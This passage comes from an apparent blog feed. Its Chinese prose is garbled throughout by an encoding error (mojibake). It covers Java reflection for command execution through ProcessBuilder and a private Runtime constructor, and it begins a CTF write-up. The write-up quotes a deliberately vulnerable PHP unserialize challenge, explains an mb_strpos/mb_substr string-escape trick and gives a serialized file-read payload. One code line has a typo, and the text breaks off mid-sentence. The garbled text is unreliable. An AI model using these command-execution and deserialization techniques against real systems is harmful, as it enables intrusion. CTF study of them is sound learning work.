class="line">java.lang.ProcessBuilder@1d81eb93</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°æˆåŠŸå®ä¾‹åŒ–ï¼Œè€ŒnewInstanceå†…çš„å‚æ•°è¢«ä¼ åˆ°äº†å®ä¾‹ä¸­ã€‚</p><h3 id="ProcessBuilderå‘½ä»¤æ‰§è¡Œçš„åå°„"><a href="#ProcessBuilderå‘½ä»¤æ‰§è¡Œçš„åå°„" class="headerlink" title="ProcessBuilderå‘½ä»¤æ‰§è¡Œçš„åå°„"></a>ProcessBuilderå‘½ä»¤æ‰§è¡Œçš„åå°„</h3><p>æˆ‘ä»¬é¦–å…ˆè¦äº†è§£ä¸€ä¸‹ProcessBuilderï¼ŒProcessBuilderå†…æœ‰å¤šç§çš„å‘½ä»¤æ‰§è¡Œæ„é€ æ–¹æ³•ï¼Œå…¶ä¸­å‚æ•°ä¹Ÿä¸åŒï¼Œä½†æ„é€ åå°„çš„æ–¹æ³•å¤§è‡´åˆ†ä¸ºä¸¤ç§ã€‚ä¸º<br><code>public ProcessBuilder(List&lt;String&gt; command)</code><br><code>public ProcessBuilder(String... command)</code></p><h4 id="åˆ©ç”¨public-ProcessBuilder-List-command"><a href="#åˆ©ç”¨public-ProcessBuilder-List-command" class="headerlink" title="åˆ©ç”¨public ProcessBuilder(List command)"></a>åˆ©ç”¨public ProcessBuilder(List<String> command)</h4><p>è¦æ„é€ è¿™ç»™çš„åå°„æˆ‘ä»¬åŒæ ·å…ˆçœ‹ä¸€ä¸‹æ­£å¸¸çš„å‘½ä»¤æ‰§è¡Œä»£ç æ˜¯ä»€ä¹ˆæ ·çš„<br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/5.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åªè¦ä½¿ç”¨ä¸Šæ–‡çš„newInstanceæ¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œå¹¶ä¸”ä¼ å‚ä¸ºListå³å¯å†è°ƒç”¨Start()å³å¯(<strong>æ³¨æ„start()æ˜¯ProcessBuilderè¿™ä¸ªç±»çš„å†…ç½®å‡½æ•°è€Œæˆ‘ä»¬å†ä½¿ç”¨newInstanceæ¥åˆ›å»ºä¸€ä¸ªå®ä¾‹æ—¶å…¶ç±»å‹ä¸ºObjectæ— æ³•è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨åå°„æ—¶æˆ‘ä»¬è¿˜è¦è¿›è¡Œç±»å‹çš„è½¬æ¢</strong>)<br>ä»£ç å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>))).start();</span><br></pre></td></tr></table></figure><br>ä½†æ˜¯å…¶å®æˆ‘ä»¬å‘ç°ä¸Šé¢çš„ä»£ç å…¶å®å¹¶ä¸æ˜¯å®Œå…¨ä½¿ç”¨åå°„æ¥å†™çš„ï¼Œæˆ‘ä»¬åªè¦åˆ©ç”¨invokeæ¥ä½¿ç”¨startå³å¯ä»¥è¿›è¡Œå¼ºåˆ¶ç±»å‹çš„è½¬æ¢<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc&quot;</span>)));</span><br></pre></td></tr></table></figure></p><h4 id="public-ProcessBuilder-Stringâ€¦-command"><a href="#public-ProcessBuilder-Stringâ€¦-command" class="headerlink" title="public ProcessBuilder(Stringâ€¦ command)"></a>public ProcessBuilder(Stringâ€¦ command)</h4><p>æ—¢ç„¶æˆ‘ä»¬éƒ½çŸ¥é“äº†<code>List&lt;String&gt;</code>è¦æ€ä¹ˆæ„é€ äº†é‚£ä¹ˆæ„é€ è¿™ä¸ªçš„éš¾é“å…¶å®å°±ä¸å¤§äº†ã€‚<br>è¦æ„é€ è¿™ä¸ªé¦–å…ˆæˆ‘ä»¬è¦å…ˆäº†è§£ä¸€ä¸‹å˜é•¿å‚æ•°ã€‚<br>å˜é•¿å‚æ•°å°±æ˜¯åœ¨åˆ›å»ºå‡½æ•°å‚æ•°ä¸ç¡®å®šæ•°é‡æ—¶ä½¿ç”¨â€¦æ¥ä»£è¡¨ï¼Œå…¶å®å˜é•¿å‚æ•°æ‰€æ¥å—çš„å°±æ˜¯ä¸€ä¸ªæ•°ç»„<br>åœ¨åº•å±‚ä¸­ä¸‹é¢çš„ä¸¤ä¸ªæ„é€ æ–¹æ³•çš„å†™æ³•å…¶å®æ˜¯ä¸€æ ·çš„<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span> &#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span> &#123;&#125;</span><br></pre></td></tr></table></figure><br>å³æˆ‘ä»¬æ‰ä½¿ç”¨è¿™ç§å‡½æ•°æ—¶ä¼ çš„å‚æ•°å…¶å®å°±æ˜¯æ•°ç»„ï¼Œå¦‚æˆ‘ä»¬è¦å°†ä¸€ä¸ªæ•°ç»„ä¼ å…¥helloè¿™ä¸ªå‡½æ•°é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String[] haha=&#123;<span class="string">&quot;lala&quot;</span>,<span class="string">&quot;haha&quot;</span>&#125;;</span><br><span class="line">hello(haha);</span><br></pre></td></tr></table></figure></p><p>å¿ƒæ€å´©äº†ï¼Œæœ¬æ¥éƒ½å†™å®Œäº†ï¼Œç»“æœä¸çŸ¥é“ä¸ºä»€ä¹ˆå‡ºäº†bugæ²¡ä¿å­˜ä¸‹æ¥ç™½å†™äº†ï¼Œä¸‹é¢æˆ‘å°±éšä¾¿å†™äº†ï¼Œçƒ¦æ­»äº†ã€‚<br>è·å– ProcessBuilder çš„ç¬¬äºŒç§æ„é€ å‡½æ•°ï¼š<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class)</span><br></pre></td></tr></table></figure><br>è·å¾—å…¶æ„é€ å‡½æ•°å°±å¯ä»¥å¾—åˆ°å…¶å®ä¾‹ï¼Œå³å¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/6.png" class="" title="alt text"><br>å…¶å…¨åå°„ä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);</span><br><span class="line">clazz.gerMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(new</span><br><span class="line">String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;));</span><br></pre></td></tr></table></figure><br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/77.png" class="" title="alt text"></p><h2 id="ç§æœ‰ç±»çš„åå°„æ„é€ "><a href="#ç§æœ‰ç±»çš„åå°„æ„é€ " class="headerlink" title="ç§æœ‰ç±»çš„åå°„æ„é€ "></a>ç§æœ‰ç±»çš„åå°„æ„é€ </h2><p>ç§æœ‰ç±»çš„åå°„æ¶‰åŠåˆ° getDeclared ç³»åˆ—çš„åå°„ï¼Œä¸æ™®é€šçš„ getMethod ã€ getConstructor åŒºåˆ«æ˜¯ï¼š<br>getMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•<br>getDeclaredMethod ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®åœ¨å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†<br><img src="/2024/07/14/java%E5%8F%8D%E5%B0%84/8.png" class="" title="alt text"><br>å¦‚ä¸Šæˆ‘ä»¬é€šè¿‡getDeclaredConstructorå¯ä»¥å¾—åˆ°ç§æœ‰çš„æ— å‚æ„é€ æ–¹æ³•<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> clazz.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><br>ä¸Šé¢çš„ä»£ç å¯ä»¥æˆåŠŸçš„è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªæ–¹æ³• setAccessible ï¼Œè¿™ä¸ªæ˜¯å¿…é¡»çš„ã€‚æˆ‘ä»¬åœ¨è·å–åˆ°ä¸€ä¸ªç§æœ‰æ–¹æ³•åï¼Œå¿…é¡»ç”¨<br>setAccessible ä¿®æ”¹å®ƒçš„ä½œç”¨åŸŸï¼Œå¦åˆ™ä»ç„¶ä¸èƒ½è°ƒç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> åå°„ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowè¥¿ç“œæ¯wp</title>
      <link href="/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/"/>
      <url>/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="æš‘å‡è¿˜æ˜¯æœ‰ç‚¹çŠ¯æ‡’äº†ï¼Œå“æ„æ–™ä¹‹ä¸­ï¼Œä¸Šå‘¨ctfshowè¥¿ç“œæ¯çš„é¢˜ç›®æˆ‘çœ‹äº†ä¸€äº›ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾ˆæœ‰ä»·å€¼çš„æ‰€æœ‰å¤ç°ä¸€ä¸‹ã€‚"><a href="#æš‘å‡è¿˜æ˜¯æœ‰ç‚¹çŠ¯æ‡’äº†ï¼Œå“æ„æ–™ä¹‹ä¸­ï¼Œä¸Šå‘¨ctfshowè¥¿ç“œæ¯çš„é¢˜ç›®æˆ‘çœ‹äº†ä¸€äº›ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾ˆæœ‰ä»·å€¼çš„æ‰€æœ‰å¤ç°ä¸€ä¸‹ã€‚" class="headerlink" title="æš‘å‡è¿˜æ˜¯æœ‰ç‚¹çŠ¯æ‡’äº†ï¼Œå“æ„æ–™ä¹‹ä¸­ï¼Œä¸Šå‘¨ctfshowè¥¿ç“œæ¯çš„é¢˜ç›®æˆ‘çœ‹äº†ä¸€äº›ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾ˆæœ‰ä»·å€¼çš„æ‰€æœ‰å¤ç°ä¸€ä¸‹ã€‚"></a>æš‘å‡è¿˜æ˜¯æœ‰ç‚¹çŠ¯æ‡’äº†ï¼Œå“æ„æ–™ä¹‹ä¸­ï¼Œä¸Šå‘¨ctfshowè¥¿ç“œæ¯çš„é¢˜ç›®æˆ‘çœ‹äº†ä¸€äº›ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾ˆæœ‰ä»·å€¼çš„æ‰€æœ‰å¤ç°ä¸€ä¸‹ã€‚</h1><h1 id="CodeInject"><a href="#CodeInject" class="headerlink" title="CodeInject"></a>CodeInject</h1><p>ç®€å•é—­åˆä¸€ä¸‹å‰é¢çš„å°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†<br><img src="/2024/07/09/ctfshow%E8%A5%BF%E7%93%9C%E6%9D%AFwp/1.png" class="" title="alt text">\</p><h1 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h1><p>å’Œciscnçº¿ä¸‹çš„pythonæ±¡æŸ“å°±ä¸å¤šè¯´äº†</p><h1 id="Ezzz-php"><a href="#Ezzz-php" class="headerlink" title="Ezzz_php"></a>Ezzz_php</h1><p>è¿™é¢˜åšé“äº†ä¸€åŠä½†æ˜¯å› ä¸ºæˆ‘æ˜¯æœ€åä¸€å¤©ä¸‹åˆæ‰æ‰“çš„è¿™ä¸ªæ¯”èµ›å¯¼è‡´æˆ‘æœ€åè™½ç„¶æŸ¥é“äº†å¦‚ä½•å°†file_get_contentså‡çº§ä¸ºå‘½ä»¤æ‰§è¡Œçš„æ–‡ç« ä½†æ˜¯è¿˜æ˜¯æ²¡æœ‰å†™å‡ºæ¥</p><h2 id="ååºåˆ—é“¾"><a href="#ååºåˆ—é“¾" class="headerlink" title="ååºåˆ—é“¾"></a>ååºåˆ—é“¾</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">read_file</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;start == <span class="string">&quot;gxngxngxn&quot;</span>)&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&#x27;What you are reading is:&#x27;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$readfile</span> = <span class="keyword">new</span> <span class="title function_ invoke__">read_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;start&#x27;</span>]);</span><br><span class="line">    <span class="variable">$read</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]:<span class="string">&quot;I_want_to_Read_flag&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;read&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$readfile</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Start_Funny_CTF!!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå®¡è®¡æºç æˆ‘ä»¬å¯ä»¥å‘ç°å…¶å­˜åœ¨ååºåˆ—å…¥å£ï¼Œä½†æ˜¯ååºåˆ—çš„<code>$ctf</code>é€šè¿‡substrstrè¿™ä¸ªå‡½æ•°å¤„ç†å¯¼è‡´å…¶ååºåˆ—çš„å†…å®¹äºå‰é¢æ‹¼æ¥çš„<code>read</code>æ— å…³è¿™æ˜¯å¾ˆçŸ›ç›¾çš„ï¼Œæ‰€æœ‰æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªsubstrstrå‡½æ•°<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¯ä»¥å‘ç°å…¶æ˜¯ä½¿ç”¨mb_strposå’Œmb_substrè¿™ä¸¤ä¸ªå‡½æ•°æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹è¿™ä¸ªä¸¤ä¸ªå‡½æ•°<br>phpçš„å†…ç½®å‡½æ•°åƒä¸Šstrlen substrè¿™æ ·çš„å­—ç¬¦å¤„ç†å‡½æ•°å…¶æ˜¯ä¼šå› ä¸ºä¸åŒçš„ç¼–ç è€Œè¿”å›ä¸åŒçš„å€¼çš„ï¼Œè¿™æ˜¯å› ä¸ºå…¶å¤„ç†å­—ç¬¦æ˜¯åœ¨å­—èŠ‚å±‚æ¬¡è¿›è¡Œçš„ï¼Œè€Œå¦‚æœæˆ‘ä»¬è¦ä½¿å¾—æ±‰å­—åœ¨ä¸åŒçš„ç¼–ç ä¸‹å¤„ç†çš„ç»“æœä¸ä¼šå‡ºç°å·®å¼‚ä»è€Œå¯¼è‡´å„ç§å„æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨mbstringè¿™ä¸ªæ‰©å±•äº†ã€‚</p><p>ä½†æ˜¯å…¶mb_strposå’Œmb_substråœ¨å¤„ç†åƒ<code>\xF0 \x9f</code>è¿™ç§utf-8çš„å­—ç¬¦ä¼šå­˜åœ¨ä¸€äº›å·®å¼‚è¿™ä¹Ÿå°±å¯¼è‡´äº†ï¼Œå­—ç¬¦ä¸²é€ƒé€¸çš„é£é™©<br>åƒé¢˜ç›®ä¸­çš„substrstrå‡½æ•°å…¶å°±ä½¿ç”¨äº†mb_strposå’Œmb_substræ¥æˆªå–<code>[]</code>å†…çš„å­—ç¬¦ã€‚<br>æˆ‘ä»¬å…ˆæ¥è¯´ä¸€ä¸‹å…¶åœ¨å¤„æ—¶å­˜åœ¨ä»€ä¹ˆæ ·çš„å·®å¼‚<br>è¿™ä¸ªæˆ‘æ˜¯çœ‹æ¥pç‰›çš„æ–‡ç« æ‰çŸ¥é“çš„ã€‚å¦‚ä¸‹ä¾‹å­<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$start</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$end</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span>=<span class="string">&quot;\xF0\x9F[aaa123]&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">substrstr</span>(<span class="variable">$read</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$data</span>;</span><br></pre></td></tr></table></figure><br>å…¶è¾“å‡ºä¸º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">8</span><br><span class="line">a123]</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è™½ç„¶æˆ‘ä»¬è¾“å‡ºçš„<code>$start</code>å’Œ<code>$end</code>ä¸º1å’Œ8ä½†æ˜¯å…¶å¹¶æ²¡æœ‰å°†é”®å€¼ä¸º2åˆ°7çš„å†…å®¹è¾“å‡ºï¼Œè¿™å°±æ˜¯å› ä¸ºmb_subposå’Œmb_substrè¿™ä¸¤ä¸ªå‡½æ•°çš„åœ¨å¤„ç†å«æœ‰utf-8å­—ç¬¦æ—¶çš„åŒºåˆ«<br>æ ¹æ®å¦‚ä¸Šçš„ç»“æœæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œmb_strposåœ¨å¤„ç†<code>\xF0\x9F[</code>è¿™ç§utf-8åè·Ÿç€æ­£å¸¸å­—ç¬¦æ—¶ä¼šç›´æ¥æˆªæ–­å°†å·²ç»è§£æçš„<code>\xF0\x9F</code>è§£æä¸ºä¸€ä¸ªå­—ç¬¦ã€‚<br>æˆ‘ä»¬éƒ½çŸ¥é“utf-8çš„ä¸€ä¸ªå­—ç¬¦æ˜¯æœ‰å››ä¸ªå­—èŠ‚çš„16è¿›åˆ¶å­—ç¬¦ç»„æˆçš„ï¼Œè€Œmb_substrå…¶åœ¨å¤„ç†å­—ç¬¦æ—¶ä¸º<code>\xF0\x9F</code>æ˜¯å¦‚æœåé¢è·Ÿç€éutf-8ç¼–ç çš„å­—ç¬¦æ˜¯å°±å’Œå°†åä¸¤ä¸ªå­—èŠ‚åˆå¹¶åˆ°å‰é¢çš„<code>\xF0\x9F</code>ä½¿å…¶ä¸æ­£å¸¸çš„utf-8æ˜¯åŒä¸€å¤§å­¦è€Œååœ¨æ­£å¸¸è§£æã€‚è¿™å¯¼è‡´äº†mb_strposä¼šå°†<code>\xF0\x9F[a</code>è§£æä¸ºä¸‰ä¸ªå­—ç¬¦è€Œmb_substrä¼šå°†å…¶è§£æä¸ºä¸€ä¸ªå­—ç¬¦è¿™ä¹Ÿå°±å¯¼è‡´äº†å…¶å­—ç¬¦ä¼šå‡å°‘ä¸¤ä¸ªã€‚è¿™ä¹Ÿå°±ä¼šå¯¼è‡´å­—ç¬¦ä¸²çš„é€ƒé€¸ã€‚</p><p>ç»è¿‡å°è¯•æˆ‘ä»¬å‘ç°äº†åªè¦ä¸æ–­å¢åŠ <code>\xF0\x9F</code>çš„æ•°é‡å³å¯é€ƒé€¸ï¼Œæ¯ä¸ª<code>\xF0\x9F\xF0\x9F</code>ä¼šè¢«mb_strposè§£æä¸ºä¸¤ä¸ªå­—ç¬¦è€Œ<code>\xF0\x9F\xF0\x9F</code>åªä¼šè¢«mb_substrè§£æä¸ºä¸€ä¸ªå­—ç¬¦è¿™ä¼šå¯¼è‡´å­—ç¬¦ä¸²å‡å°‘çš„å­—ç¬¦ä¸²é€ƒé€¸ã€‚</p><p>ç»“æœå°è¯•å‘ç°mb_strposä¼šç›´æ¥å¿½ç•¥<code>\x9f</code>ä½†æ˜¯mb_substrä¼šå°†å…¶è§£æä¸ºä¸€ä¸ªå­—ç¬¦ã€‚</p><h3 id="ä¸€"><a href="#ä¸€" class="headerlink" title="ä¸€"></a>ä¸€</h3><p>æˆ‘ä»¬è§£æé“¾çš„æ„é€ æ–¹æ³•é¦–å…ˆæˆ‘ä»¬è‚¯å®šæ˜¯è¦æ„é€ ä»»æ„æ–‡ä»¶è¯»å–äº†ã€‚ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ä»£ç ä¼šå‘ç°å…¶å¯æ§çš„åªæœ‰readå’Œ<code>$_GET[&#39;start&#39;]</code>å³<code>$start</code><br>æˆ‘ä»¬æƒ³è¦ååºåˆ—è¯çš„é“¾å­åº”è¯¥å¦‚ä¸‹<code>O:9:&quot;read_file&quot;:2:&#123;s:5:&quot;start&quot;;s:9:&quot;gxngxngxn&quot;;s:8:&quot;filename&quot;;s:5:&quot;/flag&quot;;&#125;</code>ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸Šé¢æåˆ°çš„å®½å­—ç¬¦é€ƒé€¸çš„æ–¹æ³•æ¥å°†æˆ‘ä»¬æ„é€ 